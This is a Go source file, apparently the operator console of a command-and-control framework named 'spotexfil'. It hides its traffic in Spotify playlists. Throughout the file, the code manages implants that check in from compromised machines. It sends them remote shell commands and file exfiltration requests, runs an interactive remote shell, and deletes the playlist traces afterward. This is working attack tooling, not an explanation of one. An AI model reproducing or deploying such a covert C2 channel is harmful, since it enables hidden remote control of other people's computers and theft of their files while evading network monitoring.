package c2

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/protocol"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
	"github.com/sourcefrenchy/spotexfil/internal/spotify"
)

// ClientInfo holds information about a connected implant.
type ClientInfo struct {
	Hostname    string
	OS          string
	User        string
	ConnectedAt string
	PID         int
	SessionID   string
}

// Operator sends commands and retrieves results.
type Operator struct {
	client           *spotify.Client
	key              string
	nextSeq          int
	pendingSeqs      map[int]string        // seq -> module name
	connectedClients map[string]ClientInfo  // client_id -> info
	pollBackoff      time.Duration         // 0 = normal, >0 = rate limited
	lastPoll         time.Time             // timestamp of last successful poll
	pollInterval     time.Duration         // background poll interval
	attachedClient   string                // currently attached client_id ("" = none)
}

// NewOperator creates a new operator.
func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Operator {
	if pollIntervalSec < 15 {
		pollIntervalSec = 15
	}
	return &Operator{
		client:           client,
		key:              key,
		nextSeq:          1,
		pendingSeqs:      make(map[int]string),
		connectedClients: make(map[string]ClientInfo),
		pollInterval:     time.Duration(pollIntervalSec) * time.Second,
	}
}

// SendCommand queues a command for the implant.
func (op *Operator) SendCommand(module string, args map[string]interface{}) (int, error) {
	ctx := context.Background()
	seq := op.nextSeq
	op.nextSeq++

	msg := protocol.NewC2Message(module, seq)
	msg.Args = args

	// Bind command to attached client's session
	if op.attachedClient != "" {
		if info, ok := op.connectedClients[op.attachedClient]; ok {
			msg.SessionID = info.SessionID
		}
	}

	encoded, err := protocol.EncodeMessage(msg.ToCommandMap(), op.key)
	if err != nil {
		return 0, fmt.Errorf("encode: %w", err)
	}

	chunks, err := protocol.ChunkPayload(encoded, seq,
		protocol.ChannelCmd, op.key)
	if err != nil {
		return 0, fmt.Errorf("chunk: %w", err)
	}

	if err := op.client.WriteC2Playlists(ctx, chunks); err != nil {
		return 0, fmt.Errorf("write: %w", err)
	}

	op.pendingSeqs[seq] = module
	fmt.Printf("[*] Command queued: seq=%d module=%s\n", seq, module)
	return seq, nil
}

// PollResults does a single poll pass for results.
func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
	ctx := context.Background()
	seqGroups, err := op.client.ReadC2Playlists(ctx,
		protocol.ChannelRes, op.key, -1)
	if err != nil {
		return nil, err
	}

	results := make(map[int]map[string]interface{})
	for seqNum, chunkMetas := range seqGroups {
		payload := protocol.ReassemblePayload(chunkMetas)
		result, err := protocol.DecodeMessage(payload, op.key)
		if err != nil {
			// Stale or corrupted result — discard silently
			continue
		}
		// Handle checkin beacon
		if module, ok := result["module"].(string); ok && module == "checkin" {
			op.handleCheckin(result)
			_ = op.client.CleanC2Playlists(ctx,
				protocol.ChannelRes, op.key, seqNum)
			continue
		}
		results[seqNum] = result
		_ = op.client.CleanC2Playlists(ctx,
			protocol.ChannelRes, op.key, seqNum)
		delete(op.pendingSeqs, seqNum)
	}
	return results, nil
}

// WaitForResult blocks until a specific result arrives or timeout.
func (op *Operator) WaitForResult(seq int) (map[string]interface{}, error) {
	timeout := time.Duration(shared.Proto.C2.WaitTimeout) * time.Second
	pollInterval := time.Duration(shared.Proto.C2.WaitPollInterval) * time.Second

	start := time.Now()
	for time.Since(start) < timeout {
		results, err := op.PollResults()
		if err != nil {
			return nil, err
		}
		if result, ok := results[seq]; ok {
			return result, nil
		}
		remaining := timeout - time.Since(start)
		fmt.Printf("[*] Waiting for seq=%d... (%ds remaining)\n",
			seq, int(remaining.Seconds()))
		time.Sleep(pollInterval)
	}
	return nil, fmt.Errorf("timeout waiting for seq=%d", seq)
}

// checkForCheckins polls for new implant check-ins and results.
// Returns true if anything was found.
func (op *Operator) checkForCheckins() bool {
	results, err := op.PollResults()
	if err != nil {
		wait := handleAPIError(err, "poll")
		if wait > 600 {
			// Hard block — slow down the poller dramatically
			op.pollBackoff = time.Duration(wait) * time.Second
		} else if wait > 0 {
			op.pollBackoff = time.Duration(wait) * time.Second
		}
		return false
	}
	op.pollBackoff = 0 // reset on success
	op.lastPoll = time.Now()
	if len(results) > 0 {
		seqs := make([]int, 0, len(results))
		for s := range results {
			seqs = append(seqs, s)
		}
		sort.Ints(seqs)
		for _, s := range seqs {
			fmt.Println()
			displayResult(s, results[s])
			fmt.Print(op.prompt())
		}
		return true
	}
	return false
}

// startBackgroundPoller runs a goroutine that continuously polls
// for new checkins and results, with smart backoff.
func (op *Operator) startBackgroundPoller(stopCh chan struct{}) {
	interval := op.pollInterval

	for {
		select {
		case <-stopCh:
			return
		case <-time.After(interval):
			// Respect rate limit backoff
			if op.pollBackoff > 0 {
				interval = op.pollBackoff
				op.pollBackoff = 0
				continue
			}

			found := op.checkForCheckins()
			if found {
				interval = op.pollInterval
			} else {
				// Gradual backoff, max 2x configured interval
				maxInterval := op.pollInterval * 2
				if interval < maxInterval {
					interval = interval + 10*time.Second
				}
			}
		}
	}
}

// Interactive runs the interactive operator console.
func (op *Operator) Interactive() {
	fmt.Print("\033[32m")
	fmt.Println(`
  ┌─────────────────────────────────────────────┐
  │  ___            _   ___       __ _ _        │
  │ / __|_ __  ___ | |_| __|__ _/ _(_) |       │
  │ \__ \ '_ \/ _ \|  _| _|\ \ /  _| | |      │
  │ |___/ .__/\___/ \__|___/_\_\_| |_|_|_|      │
  │     |_|                                     │
  │         C2 OPERATOR CONSOLE                 │
  └─────────────────────────────────────────────┘`)
	fmt.Print("\033[0m\n\n")
	fmt.Printf("  \033[36mPolling every %ds\033[0m | Type '\033[1mhelp\033[0m' for commands\n\n",
		int(op.pollInterval.Seconds()))

	// Initial check for pending checkins
	op.checkForCheckins()

	// Start background poller for automatic checkin/result notifications
	stopCh := make(chan struct{})
	go op.startBackgroundPoller(stopCh)
	defer func() { close(stopCh) }()

	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Print(op.prompt())
		if !scanner.Scan() {
			fmt.Println("\n[*] Exiting")
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.SplitN(line, " ", 2)
		cmd := strings.ToLower(parts[0])
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		switch cmd {
		case "quit", "exit":
			fmt.Println("[*] Exiting")
			return
		case "help":
			printHelp()
		case "agents":
			op.printAgents()
		case "attach":
			op.attachAgent(arg)
		case "detach":
			op.detachAgent()
		case "shell":
			if !op.requireAttached() {
				continue
			}
			if arg == "" {
				fmt.Println("[!] Usage: shell <command>")
				continue
			}
			op.SendCommand("shell", map[string]interface{}{"cmd": arg})
		case "exfil":
			if !op.requireAttached() {
				continue
			}
			if arg == "" {
				fmt.Println("[!] Usage: exfil <path>")
				continue
			}
			op.SendCommand("exfil", map[string]interface{}{"path": arg})
		case "sysinfo":
			if !op.requireAttached() {
				continue
			}
			op.SendCommand("sysinfo", nil)
		case "ishell":
			if !op.requireAttached() {
				continue
			}
			op.interactiveShell(scanner)
		case "results":
			results, err := op.PollResults()
			if err != nil {
				fmt.Printf("[!] Poll error: %v\n", err)
				continue
			}
			if len(results) > 0 {
				seqs := make([]int, 0, len(results))
				for s := range results {
					seqs = append(seqs, s)
				}
				sort.Ints(seqs)
				for _, s := range seqs {
					displayResult(s, results[s])
				}
			} else {
				fmt.Println("[*] No results available")
			}
		case "wait":
			if arg == "" {
				fmt.Println("[!] Usage: wait <seq>")
				continue
			}
			seqNum, err := strconv.Atoi(arg)
			if err != nil {
				fmt.Println("[!] seq must be a number")
				continue
			}
			result, err := op.WaitForResult(seqNum)
			if err != nil {
				fmt.Printf("[!] %v\n", err)
				continue
			}
			if result != nil {
				displayResult(seqNum, result)
			}
		case "clean":
			op.cleanAll()
		case "status":
			op.printStatus()
		default:
			// When attached, treat unknown commands as shell commands
			if op.attachedClient != "" {
				op.SendCommand("shell", map[string]interface{}{"cmd": line})
			} else {
				fmt.Printf("[!] Unknown command: %s. Type 'help'.\n", cmd)
			}
		}
	}
}

// prompt returns the current prompt string based on attach state.
func (op *Operator) prompt() string {
	ts := time.Now().Format("15:04")
	if op.attachedClient != "" {
		info := op.connectedClients[op.attachedClient]
		return fmt.Sprintf("[%s] %s@%s > ",
			ts, op.attachedClient[:8], info.Hostname)
	}
	return fmt.Sprintf("[%s] c2> ", ts)
}

// printAgents shows a table of connected implants.
func (op *Operator) printAgents() {
	if len(op.connectedClients) == 0 {
		fmt.Println("[*] No agents connected")
		return
	}
	fmt.Printf("\n  %-10s %-16s %-20s %-10s %s\n",
		"ID", "HOSTNAME", "OS", "USER", "CONNECTED")
	fmt.Printf("  %-10s %-16s %-20s %-10s %s\n",
		"----------", "----------------", "--------------------",
		"----------", "-------------------")
	for cid, info := range op.connectedClients {
		marker := "  "
		if cid == op.attachedClient {
			marker = "* "
		}
		fmt.Printf("%s%-10s %-16s %-20s %-10s %s\n",
			marker, cid[:8], info.Hostname, info.OS,
			info.User, info.ConnectedAt)
	}
	fmt.Println()
}

// attachAgent attaches to a specific agent by client_id (or prefix).
func (op *Operator) attachAgent(idPrefix string) {
	if idPrefix == "" {
		// If only one agent, auto-attach
		if len(op.connectedClients) == 1 {
			for cid := range op.connectedClients {
				op.attachedClient = cid
				info := op.connectedClients[cid]
				fmt.Printf("[*] Attached to %s (%s)\n",
					cid[:8], info.Hostname)
				return
			}
		}
		fmt.Println("[!] Usage: attach <client_id>")
		fmt.Println("[!] Use 'agents' to list connected implants")
		return
	}

	// Match by prefix
	for cid, info := range op.connectedClients {
		if strings.HasPrefix(cid, idPrefix) {
			op.attachedClient = cid
			fmt.Printf("[*] Attached to %s (%s)\n",
				cid[:8], info.Hostname)
			return
		}
	}
	fmt.Printf("[!] No agent matching '%s'. Use 'agents' to list.\n", idPrefix)
}

// detachAgent detaches from the current agent.
func (op *Operator) detachAgent() {
	if op.attachedClient == "" {
		fmt.Println("[*] Not attached to any agent")
		return
	}
	info := op.connectedClients[op.attachedClient]
	fmt.Printf("[*] Detached from %s (%s)\n",
		op.attachedClient[:8], info.Hostname)
	op.attachedClient = ""
}

// requireAttached checks if an agent is attached before running commands.
func (op *Operator) requireAttached() bool {
	if op.attachedClient == "" {
		fmt.Println("[!] No agent attached. Use 'agents' to list, 'attach <id>' to select.")
		return false
	}
	return true
}

// interactiveShell provides a remote shell experience.
// Detects client OS and shows appropriate prompt ($ or >).
// Each command is sent, then waits with animated dots until result arrives.
func (op *Operator) interactiveShell(scanner *bufio.Scanner) {
	clientID := op.attachedClient
	info := op.connectedClients[clientID]

	// Determine shell type from OS
	isWindows := strings.Contains(strings.ToLower(info.OS), "windows")
	promptChar := "$"
	shellType := "bash"
	if isWindows {
		promptChar = ">"
		shellType = "powershell"
	}

	shellPrompt := fmt.Sprintf("%s@%s %s ", clientID[:8], info.Hostname, promptChar)

	fmt.Printf("\n\033[36m[*] Interactive shell to %s (%s)\033[0m\n",
		info.Hostname, info.OS)
	fmt.Printf("\033[36m[*] Shell: %s | Commands queue automatically | 'quit' to exit\033[0m\n\n",
		shellType)

	// Pending commands queue: seq -> command string
	type pendingCmd struct {
		seq int
		cmd string
	}
	var pending []pendingCmd
	var mu sync.Mutex

	// Background result drainer
	stopDrain := make(chan struct{})
	go func() {
		for {
			select {
			case <-stopDrain:
				return
			case <-time.After(3 * time.Second):
				results, err := op.PollResults()
				if err != nil || len(results) == 0 {
					continue
				}

				mu.Lock()
				for i := 0; i < len(pending); i++ {
					pc := pending[i]
					if result, ok := results[pc.seq]; ok {
						// Clear current line, print result
						fmt.Printf("\r\033[K")

						data, _ := result["data"].(string)
						status, _ := result["status"].(string)

						// Show which command this is for
						fmt.Printf("\033[90m$ %s\033[0m\n", pc.cmd)
						if status == "error" {
							fmt.Printf("\033[31m%s\033[0m", data)
						} else {
							fmt.Print(data)
						}
						if len(data) > 0 && data[len(data)-1] != '\n' {
							fmt.Println()
						}

						// Remove from pending
						pending = append(pending[:i], pending[i+1:]...)
						i--
					}
				}

				// Show queue status and re-print prompt
				if len(pending) > 0 {
					fmt.Printf("\033[33m[queued: %d]\033[0m ",
						len(pending))
				}
				fmt.Print(shellPrompt)
				mu.Unlock()
			}
		}
	}()

	defer close(stopDrain)

	for {
		mu.Lock()
		queueLen := len(pending)
		mu.Unlock()

		if queueLen > 0 {
			fmt.Printf("\033[33m[queued: %d]\033[0m %s",
				queueLen, shellPrompt)
		} else {
			fmt.Print(shellPrompt)
		}

		if !scanner.Scan() {
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		if line == "quit" || line == "exit" {
			mu.Lock()
			remain := len(pending)
			mu.Unlock()
			if remain > 0 {
				fmt.Printf("[*] Draining %d pending command(s)...\n", remain)
				// Wait briefly for remaining results
				deadline := time.After(15 * time.Second)
				for {
					mu.Lock()
					if len(pending) == 0 {
						mu.Unlock()
						break
					}
					mu.Unlock()
					select {
					case <-deadline:
						fmt.Println("[!] Timeout, some results may be lost")
						goto exitShell
					case <-time.After(1 * time.Second):
					}
				}
			}
		exitShell:
			fmt.Println("[*] Leaving interactive shell")
			return
		}

		// Send command (non-blocking)
		seq, err := op.SendCommand("shell", map[string]interface{}{"cmd": line})
		if err != nil {
			fmt.Printf("[!] Failed to send: %v\n", err)
			continue
		}

		mu.Lock()
		pending = append(pending, pendingCmd{seq: seq, cmd: line})
		fmt.Printf("\033[90m  -> queued seq=%d\033[0m\n", seq)
		mu.Unlock()
	}
}

func (op *Operator) cleanAll() {
	ctx := context.Background()
	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelCmd, op.key, -1)
	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelRes, op.key, -1)
	fmt.Println("[*] All C2 playlists cleaned")
}

func (op *Operator) printStatus() {
	if len(op.connectedClients) > 0 {
		fmt.Printf("[*] Connected implants (%d):\n", len(op.connectedClients))
		for cid, info := range op.connectedClients {
			fmt.Printf("  %s  %s  %s  since %s\n",
				cid, info.Hostname, info.OS, info.ConnectedAt)
		}
	} else {
		fmt.Println("[*] No implants connected")
	}
	if len(op.pendingSeqs) > 0 {
		fmt.Println("[*] Pending commands:")
		seqs := make([]int, 0, len(op.pendingSeqs))
		for s := range op.pendingSeqs {
			seqs = append(seqs, s)
		}
		sort.Ints(seqs)
		for _, s := range seqs {
			fmt.Printf("  seq=%d module=%s\n", s, op.pendingSeqs[s])
		}
	} else {
		fmt.Println("[*] No pending commands")
	}
	fmt.Printf("[*] Next seq: %d\n", op.nextSeq)
	if !op.lastPoll.IsZero() {
		ago := time.Since(op.lastPoll).Truncate(time.Second)
		fmt.Printf("[*] Last poll: %s (%s ago)\n",
			op.lastPoll.Format("15:04:05"), ago)
	} else {
		fmt.Println("[*] Last poll: never")
	}
}

func (op *Operator) handleCheckin(result map[string]interface{}) {
	data, _ := result["data"].(string)
	var info map[string]interface{}
	if err := json.Unmarshal([]byte(data), &info); err != nil {
		return
	}
	clientID, _ := info["client_id"].(string)

	// Skip if already known
	if _, exists := op.connectedClients[clientID]; exists {
		return
	}

	hostname, _ := info["hostname"].(string)
	osInfo, _ := info["os"].(string)
	user, _ := info["user"].(string)
	sessionID, _ := info["session_id"].(string)
	pid := 0
	if p, ok := info["pid"].(float64); ok {
		pid = int(p)
	}
	timestamp := time.Now().Format("2006-01-02 15:04:05")

	op.connectedClients[clientID] = ClientInfo{
		Hostname:    hostname,
		OS:          osInfo,
		User:        user,
		ConnectedAt: timestamp,
		PID:         pid,
		SessionID:   sessionID,
	}

	fmt.Printf("\n[+] New implant connected!\n"+
		"    client_id : %s\n"+
		"    session   : %s\n"+
		"    hostname  : %s\n"+
		"    os        : %s\n"+
		"    user      : %s\n"+
		"    timestamp : %s\n\n%s",
		clientID, sessionID[:12], hostname, osInfo, user, timestamp,
		op.prompt())
}

func displayResult(seq int, result map[string]interface{}) {
	module, _ := result["module"].(string)
	status, _ := result["status"].(string)
	data, _ := result["data"].(string)

	fmt.Printf("\n--- Result seq=%d [%s] status=%s ---\n", seq, module, status)
	if module == "sysinfo" && status == "ok" {
		var info map[string]interface{}
		if json.Unmarshal([]byte(data), &info) == nil {
			for k, v := range info {
				fmt.Printf("  %s: %v\n", k, v)
			}
		} else {
			fmt.Println(data)
		}
	} else {
		fmt.Println(data)
	}
	fmt.Println("---")
}

func printHelp() {
	fmt.Println(`
Agent management:
  agents          List connected implants
  attach <id>     Attach to an agent (prefix match, e.g. 'attach 0f7b')
  detach          Detach from current agent

Commands (requires attached agent):
  ishell          Interactive remote shell (auto-detects bash/powershell)
  shell <cmd>     Execute a single shell command
  exfil <path>    Exfiltrate a file
  sysinfo         Gather system info

Other:
  results         Poll for pending results
  wait <seq>      Wait for a specific result
  status          Show agents and pending commands
  clean           Remove all C2 playlists
  help            Show this help
  quit / exit     Exit the console`)
}
